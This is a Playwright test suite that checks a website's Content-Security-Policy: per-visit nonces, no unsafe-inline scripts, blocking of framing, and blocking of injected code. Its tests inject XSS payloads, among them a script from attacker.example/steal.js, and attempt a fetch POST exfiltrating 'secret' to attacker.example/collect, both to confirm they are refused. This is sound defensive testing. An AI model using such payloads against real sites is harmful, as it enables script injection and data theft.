import { expect, test, type Page } from "@playwright/test";

/**
 * The Content-Security-Policy in real browsers. Every page must work with it
 * (no blocked scripts of our own), and attacks must fail: code injected into
 * a page as the server sends it, inline event handlers, scripts from other
 * sites, framing by another site, and sending data elsewhere.
 */
const PAGES = [
  "/",
  "/get-the-app",
  "/maintenance",
  "/features",
  "/fees-and-limits",
  "/cookies",
  "/blog",
  "/blog/five-scams",
  "/help/how-do-i-freeze-my-account",
];

/** Records every policy violation the page reports, from before it loads. */
async function watchViolations(page: Page) {
  await page.addInitScript(() => {
    (window as unknown as { violations: string[] }).violations = [];
    document.addEventListener("securitypolicyviolation", (event) => {
      (window as unknown as { violations: string[] }).violations.push(
        `${event.violatedDirective} ${event.blockedURI}`,
      );
    });
  });
}

const violations = (page: Page) =>
  page.evaluate(() => (window as unknown as { violations: string[] }).violations);

test.describe("Content-Security-Policy", () => {
  test("every page sends it, with a new key on every visit", async ({ page }) => {
    for (const path of PAGES) {
      const first = (await page.goto(path))!.headers()["content-security-policy"]!;
      const second = (await page.goto(path))!.headers()["content-security-policy"]!;
      expect(first).toContain("frame-ancestors 'none'");
      expect(first).toContain("connect-src 'self'");
      const key = (policy: string) => /'nonce-([^']+)'/.exec(policy)?.[1];
      expect(key(first)).toBeTruthy();
      expect(key(first)).not.toBe(key(second));
      expect(first.split("; ").find((part) => part.startsWith("script-src"))).not.toContain(
        "unsafe-inline",
      );
    }
  });

  test("our own pages run with no violations, and every script carries the key", async ({
    page,
  }) => {
    await watchViolations(page);
    for (const path of PAGES) {
      await page.goto(path, { waitUntil: "networkidle" });
      const unkeyed = await page.evaluate(() =>
        [...document.scripts].filter((script) => !script.nonce).map((script) => script.src),
      );
      expect(unkeyed, path).toEqual([]);
      expect(await violations(page), path).toEqual([]);
    }
  });

  test("code injected into a page as the server sends it does not run", async ({ page }) => {
    await watchViolations(page);
    await page.route(/\/$/, async (route) => {
      const response = await route.fetch();
      const attack =
        '<script>window.pwned = "inline script"</script>' +
        '<img src="/no-such-image.png" onerror="window.pwned = \'event handler\'">' +
        '<a id="trap" href="javascript:window.pwned=\'javascript link\'">x</a>' +
        '<script src="https://attacker.example/steal.js"></script>';
      const body = (await response.text()).replace("</body>", `${attack}</body>`);
      await route.fulfill({ response, body });
    });
    await page.goto("/", { waitUntil: "networkidle" });
    await page.evaluate(() => document.getElementById("trap")!.click());
    await page.waitForTimeout(500);

    expect(
      await page.evaluate(() => (window as unknown as { pwned?: string }).pwned),
    ).toBeUndefined();
    const blocked = await violations(page);
    expect(blocked.filter((entry) => entry.startsWith("script-src")).length).toBeGreaterThanOrEqual(
      3,
    );
  });

  test("another site can't show the website inside a frame", async ({ page, baseURL }) => {
    await page.setContent(`<iframe id="frame" src="${baseURL}/"></iframe>`);
    await page.waitForTimeout(1500);
    const framed = page.frameLocator("#frame");
    await expect(framed.getByRole("heading", { level: 1 })).toHaveCount(0);
  });

  test("even code that did run couldn't send data to another site", async ({ page }) => {
    await page.goto("/");
    const result = await page.evaluate(async () => {
      try {
        await fetch("https://attacker.example/collect", { method: "POST", body: "secret" });
        return "sent";
      } catch {
        return "refused";
      }
    });
    expect(result).toBe("refused");
  });
});
